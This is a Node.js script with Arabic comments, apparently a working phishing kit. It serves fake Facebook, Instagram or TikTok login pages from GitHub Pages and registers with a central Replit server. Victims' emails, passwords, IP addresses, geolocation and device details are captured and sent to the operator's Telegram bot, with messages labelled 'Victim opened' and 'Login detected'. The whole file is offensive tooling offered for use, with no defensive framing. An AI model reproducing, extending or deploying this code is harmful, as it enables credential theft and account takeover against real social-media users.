#!/usr/bin/env node
const express = require('express');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const ua = require('ua-parser-js');
const readline = require('readline');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const ask = q => new Promise(res => rl.question(q, ans => res(ans)));

// ⚠️ عدّل هذا برابط Replit الذي حصلت عليه
const CENTRAL_SERVER = 'https://central-server--mosmanhacker.replit.app';

async function main() {
  const TOKEN = await ask('BOT_TOKEN: ');
  const MASTER = await ask('MASTER_ID: ');
  
  console.log('\n1- Facebook\n2- Instagram\n3- TikTok');
  const c = await ask('Select page (1-3): ');
  const p = ['fb', 'ig', 'tt'][parseInt(c) - 1] || 'fb';
  rl.close();

  // ✅ الروابط النهائية (3 حسابات GitHub)
  const PAGES = {
    fb: 'https://mosmanhacker.github.io/fb',
    ig: 'https://instagram-mosmanhem.github.io/ig',
    tt: 'https://tiktok-mosmanhem.github.io/tt'
  };

  require('fs').writeFileSync('.env', `TOKEN=${TOKEN}\nMASTER=${MASTER}`);

  const bot = new Telegraf(TOKEN);
  const app = express();
  app.use(express.json({ limit: '1mb' }));
  app.use(express.urlencoded({ extended: true }));

  // ✅ تسجيل في الخادم الوسط
  const ip = require('os').networkInterfaces().wlan0?.[0]?.address || 'localhost';
  await axios.post(`${CENTRAL_SERVER}/register`, { id: MASTER, platform: p })
    .then(() => console.log(`[OK] Registered in central server`))
    .catch(e => console.log(`[ERROR] ${e.message}`));

  // ✅ رسالة اتصال
  bot.telegram.sendMessage(MASTER, `✅ Connected!`).catch(() => {});

  const ext = `${PAGES[p]}/?id=${MASTER}`;
  const int = `http://${ip}:8080/${p}`;
  console.log(`\n🌍 Public URL: ${ext}`);
  console.log(`🏠 Local URL:  ${int}\n`);

  // ✅ خدمة الصفحة على localhost
  app.get(`/${p}`, async (req, res) => {
    try {
      const { data } = await axios.get(`${PAGES[p]}/index.html`);
      res.send(data);
    } catch {
      res.send('<h1>Page not ready yet</h1>');
    }
  });

  // ✅ استقبال البيانات
  app.post('/', async (req, res) => {
    const { id, email, pass, ua: s, ip } = req.body;
    if (id !== MASTER) return res.sendStatus(403);

    const dev = ua(s || req.headers['user-agent']);
    const geo = await axios.get(`http://ip-api.com/json/${ip}`).catch(() => ({ data: {} }));

    if (!email && !pass) {
      const msg = `🔥 Victim opened\nPlatform: ${p}\nIP: ${ip}\nCountry: ${geo.data.country || '?'}\nDevice: ${dev.os.name || '?'} ${dev.device.model || ''}\nBrowser: ${dev.browser.name || '?'}`;
      bot.telegram.sendMessage(MASTER, msg).catch(() => {});
    } else {
      const msg = `✅ Login detected\nPlatform: ${p}\nEmail: ${email}\nPass: ${pass}\nIP: ${ip}`;
      bot.telegram.sendMessage(MASTER, msg).catch(() => {});
    }
    res.sendStatus(200);
  });

  bot.launch();
  app.listen(8080, '0.0.0.0', () => console.log('\nServer running on http://0.0.0.0:8080\n'));
}
main();
